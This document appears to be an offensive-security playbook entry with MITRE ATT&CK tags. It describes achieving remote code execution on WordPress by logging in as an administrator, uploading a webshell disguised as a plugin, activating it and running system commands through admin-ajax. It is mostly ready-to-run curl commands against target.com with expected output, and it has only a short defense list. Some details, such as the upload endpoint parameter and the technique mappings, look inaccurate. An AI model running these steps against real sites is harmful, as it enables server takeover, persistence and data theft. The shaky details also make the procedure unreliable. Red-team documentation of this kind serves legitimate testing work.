---
id: p3c4d5e6-f7g8-9012-cdef-345678901234
tags:
  - rce
  - wordpress
  - plugin-upload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/wp-admin-login]]'
  - '[[commands/wp-plugin-upload-rce]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:32:48.296Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques:
  - '[[JavaScript]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Remote File Copy]]'
---
# Execute-RCE-as-WordPress-Administrator

## Summary

This procedure uses administrator privileges to upload and execute malicious code via WordPress plugin installation, achieving remote code execution on the server.

## Description

With admin access, attackers can upload ZIP files containing PHP webshells as plugins or themes through the WordPress admin API. Once activated, these can execute arbitrary system commands. This targets PHP environments on Linux/Unix servers running WordPress, assuming file upload permissions are standard (e.g., via wp-content/uploads).

## Requirements

1. Administrator role on the WordPress site
2. Access to wp-admin endpoints
3. Malicious plugin ZIP prepared (e.g., with phpinfo() or system() calls)

## Defense

Defensive measures and detection strategies:

- Restrict plugin/theme uploads to trusted admins
- Use file integrity monitoring on wp-content
- Log and alert on new plugin installations via audit plugins like Wordfence

## Objectives

1. Upload malicious code to the server
2. Activate and trigger code execution
3. Run arbitrary commands for persistence or exfiltration

## Instructions

### Step 1: Authenticate as Admin

**Context**: Log in to obtain admin session cookies.

**Command** ([[commands/wp-admin-login]]):
```bash
curl -c admin_cookies.txt -d 'log=attacker&pwd=weakpass123' https://target.com/wp-login.php
```

> Captures admin session. Expected: Redirect to wp-admin.

### Step 2: Upload Malicious Plugin

**Context**: POST the ZIP file to the plugin install endpoint.

**Command** ([[commands/wp-plugin-upload-rce]]):
```bash
curl -b admin_cookies.txt -X POST https://target.com/wp-admin/plugin-install.php?TabFunction=install -F "pluginzip=@malicious-plugin.zip" -H "Referer: https://target.com/wp-admin/"
```

> Uploads and installs the plugin. Expected: Success message and plugin listed.

### Step 3: Activate and Execute

**Context**: Activate the plugin and trigger RCE via AJAX or direct endpoint.

**Command** ([[commands/wp-activate-rce]]):
```bash
curl -b admin_cookies.txt -X POST https://target.com/wp-admin/plugins.php?action=activate&plugin=malicious-plugin/malicious.php
```

Then execute:
```bash
curl -b admin_cookies.txt -X POST https://target.com/wp-admin/admin-ajax.php?action=malicious_rce -d 'cmd=system("id");'
```

> Response includes command output like 'uid=33(www-data) gid=33(www-data)'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques

- [[JavaScript]] JavaScript (for client-side, but PHP here)

## Commands Used

- [[commands/wp-admin-login]]
- [[commands/wp-plugin-upload-rce]]
- [[commands/wp-activate-rce]]

## Tools Used

-

## Tags

- [[rce]]
- [[wordpress]]
- [[plugin-upload]]
